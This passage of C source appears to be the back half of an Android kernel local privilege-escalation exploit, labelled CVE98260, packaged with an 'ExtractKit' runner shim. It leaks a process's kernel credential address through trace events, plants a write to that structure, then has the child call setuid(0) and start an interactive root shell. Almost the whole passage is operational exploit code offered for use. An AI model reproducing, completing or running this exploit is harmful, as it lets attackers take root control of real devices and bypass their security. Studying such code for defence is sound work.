                _exit(125);
            close(go[0]);
            close(st[1]);
            dup2(g2, 3);
            close(g2);
            dup2(s2, 4);
            close(s2);
            pin(g_cpu);
            if (read(3, &ch, 1) != 1)
                _exit(126);
            {
                char *const av[] = { (char *)"/proc/self/exe", (char *)"wait",
                                     (char *)(shell_mode ? "shell" : "verify"), NULL };
                char *const ep[] = { (char *)"PATH=/system/bin:/system/xbin", NULL };

                execve("/proc/self/exe", av, ep);
            }
            _exit(127);
        }
        if (p < 0) {
            close(go[0]); close(go[1]); close(st[0]); close(st[1]);
            return 0;
        }
        close(go[0]);
        close(st[1]);
        trace_start();
        if (write(go[1], "A", 1) != 1)
            logf("[!] leak go write failed\n");
        usleep(50000);
        trace_stop();
        n = read_cpu(g_cpu, raw, 48u << 20);
        c = n > 0 ? parse_events(raw, (size_t)n, evs, 400000) : 0;
        for (int i = 0; i < c; i++) {
            if (evs[i].type == EV_KMEM_CACHE_ALLOC && evs[i].pid == (int)p &&
                evs[i].req == CRED_REQ && evs[i].alloc == CRED_ALLOC &&
                (evs[i].site & 0x1fffff) == CRED_SITE_LOW21) {
                R = evs[i].ptr;
                site = evs[i].site;
                break;
            }
        }
        if (R) {
            struct pollfd pf = { .fd = st[0], .events = POLLIN };

            if (poll(&pf, 1, 2000) > 0 &&
                read(st[0], &hello, sizeof(hello)) == sizeof(hello) &&
                hello == CHILD_HELLO) {
                logf("[cred] attempt=%d child=%d R=%#llx site=%#llx "
                       "site_low=%#llx recs=%d\n",
                       attempt, p, R, site, site & 0x1fffff, c);
                *out_pid = p;
                *out_go = go[1];
                *out_st = st[0];
                return R;
            }
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d failed\n",
               attempt, p, R, hello, c);
        close(go[1]);
        close(st[0]);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
    }
    return 0;
}

static int wait_child_main(int shell_mode)
{
    struct child_report rep;
    char ch;
    int hello = CHILD_HELLO;

    (void)signal(SIGPIPE, SIG_IGN);
    pin(g_cpu);
    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
        _exit(130);
    if (read(3, &ch, 1) != 1)
        _exit(131);
    close(3);

    memset(&rep, 0, sizeof(rep));
    rep.magic = CHILD_MAGIC;
    rep.uid = (int)syscall(SYS_getuid);
    rep.euid = (int)syscall(SYS_geteuid);
    logf("[child] woke uid=%d euid=%d\n", rep.uid, rep.euid);
    if (rep.uid != 0) {
        rep.setuid_ret = -1;
        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[-] child uid is not 0: cred write did not land\n");
        _exit(3);
    }

    errno = 0;
    rep.setuid_ret = (int)syscall(SYS_setuid, 0);
    rep.setuid_errno = errno;
    {
        uid_t ru = 0, eu = 0, su = 0;

        getresuid(&ru, &eu, &su);
        rep.ruid = (int)ru;
        rep.reuid = (int)eu;
        rep.rsuid = (int)su;
    }
    (void)write(4, &rep, sizeof(rep));
    close(4);
    logf("[child] setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
           rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
    if (rep.setuid_ret != 0) {
        logf("[-] setuid(0) failed; not running a shell\n");
        _exit(4);
    }

    {
        char *const envp[] = { (char *)"PATH=/system/bin:/system/xbin", NULL };

        if (shell_mode) {
            char *const av[] = { (char *)"sh", (char *)"-i", NULL };

            execve("/system/bin/sh", av, envp);
        } else {
            char *const av[] = { (char *)"sh", (char *)"-c",
                (char *)"id; cat /proc/self/attr/current; "
                        "echo ROOT_SHELL_OK", NULL };

            execve("/system/bin/sh", av, envp);
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}

static int uid0_worker_main(int argc, char **argv)
{
    unsigned char *raw;
    struct ev *evs;
    int shell_mode = 0, leak_only = 0, probe_ids = 0, page_test = 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc > 1 && !strcmp(argv[1], "wait"))
        return wait_child_main(argc > 2 && !strcmp(argv[2], "shell"));

    if (argc > 1 && !strcmp(argv[1], "shell"))
        shell_mode = 1;
    if (argc > 1 && !strcmp(argv[1], "leak"))
        leak_only = 1;
    if (argc > 1 && !strcmp(argv[1], "--probe-ids"))
        probe_ids = 1;
    if (argc > 1 && !strcmp(argv[1], "pagelifetime"))
        page_test = 1;

    raw = malloc(48u << 20);
    evs = malloc(sizeof(*evs) * 400000);
    if (!raw || !evs) return 1;
    if (argc > 2 && !strcmp(argv[1], "cpu")) g_cpu = atoi(argv[2]);

    if (argv[0] && argv[0][0] == '\0')
        _exit(42);

    {
        int pc = vuln_precheck("uid0", argc, argv, 1, 0);
        if (pc == CVE98260_PRECHECK_EXIT_OK)
            return 0;
        if (pc != 0)
            return 2;
    }
    if (!cve98260_active_profile) {
        printf("[-] no matching kernel profile\n");
        return 2;
    }

    pin(g_cpu);
    if (probe_ids) {
        int ok = cve98260_trace_ids_init(g_cpu, 1, 1);

        logf("[trace-ids] probe %s\n", ok == 0 ? "ok" : "failed");
        return ok == 0 ? 0 : 1;
    }
    if (cve98260_trace_ids_init(g_cpu, leak_only, 0) != 0) {
        logf("[-] trace event id probe failed\n");
        return 1;
    }
    logf("[+] pid=%d cpu=%d\n", getpid(), g_cpu);
    enable_events();
    kick_rss();
    usleep(50000);

    g_base = calibrate_base(raw, evs);
    if (!g_base) { logf("[-] base calibration failed\n"); return 1; }
    if (page_test)
        return page_lifetime_test(raw, evs);
    prefill_timers(PREFILL_TIMERS);

    pid_t C = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long R = leak_cred(raw, evs, &C, &go_fd, &st_fd, shell_mode);
    if (!R) { logf("[-] cred leak failed\n"); return 1; }
    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + 8);
    if (leak_only) {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[+] leak-only run complete\n");
        return 0;
    }
    ensure_pool();
    ensure_raw();

    struct plant_res r;
    memset(&r, 0, sizeof(r));
    for (int a = 0; a < 3 && !r.ok; a++) {
        logf("[+] plant attempt %d/3\n", a + 1);
        run_plant(R + 8, 1, &r, raw, evs);
    }
    if (!r.ok)
        park_forever("no successful plant");
    logf("[+] cred write landed, waking child\n");

    if (write(go_fd, "A", 1) != 1)
        logf("[!] child wake write failed\n");
    close(go_fd);

    {
        struct child_report rep;
        struct pollfd pf = { .fd = st_fd, .events = POLLIN };
        ssize_t rn = -1;

        if (poll(&pf, 1, 10000) > 0)
            rn = read(st_fd, &rep, sizeof(rep));
        close(st_fd);
        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC) {
            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                   rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
                   rep.ruid, rep.reuid, rep.rsuid);
            if (rep.setuid_ret != 0 || rep.reuid != 0)
                logf("[!] child did not reach euid 0\n");
        } else {
            logf("[!] child report missing (n=%zd)\n", rn);
        }
    }

    {
        int st = 0;

        if (waitpid(C, &st, 0) == C)
            logf("[+] child exit status=%#x\n", st);
    }
    if (g_held)
        park_forever("root shell finished; failed-plant zombies are held");
    logf("[+] done\n");
    return 0;
}

int main(int argc, char **argv)
{
    cve_lifecycle_ignore_signals();
    /*
     * ExtractKit shim (added on top of the upstream file; no upstream line
     * changed): the app's generic runner speaks check / selftest / leak /
     * fake / shell.  "check" and "selftest" must never fire the chain, so
     * they are answered by the upstream precheck alone; "fake" and the empty
     * default fall through to the upstream verify run, and "leak"/"shell"
     * mean exactly what they mean upstream.
     */
    if (argc > 1 && (!strcmp(argv[1], "check") || !strcmp(argv[1], "selftest"))) {
        char *av[3];
        int rc;

        av[0] = argv[0];
        av[1] = (char *)"--check";
        av[2] = NULL;
        rc = vuln_precheck("uid0", 2, av, 1, 0);
        printf("[check] %s\n", rc == CVE98260_PRECHECK_EXIT_OK ? "READY" : "NOT-READY");
        fflush(NULL);
        return rc == CVE98260_PRECHECK_EXIT_OK ? 0 : 3;
    }
    if (argc > 1 && !strcmp(argv[1], "fake")) {
        /* the app's word for "run the chain, no interactive shell" */
        argc = 1;
    }
    /* trace-ids exec probe fast exit. */
    if (argc > 1 && argv[1] && !strcmp(argv[1], "--exec-ok"))
        _exit(0);
    /*
     * The exec'd wait child and the empty-argv exec helper must not create a
     * keeper: they are themselves part of the exploit's process tree.
     */
    if (argc > 1 && !strcmp(argv[1], "wait"))
        return uid0_worker_main(argc, argv);
    if (argc > 0 && argv[0] && argv[0][0] == '\0')
        return uid0_worker_main(argc, argv);
    return cve_lifecycle_supervise(uid0_worker_main, argc, argv);
}
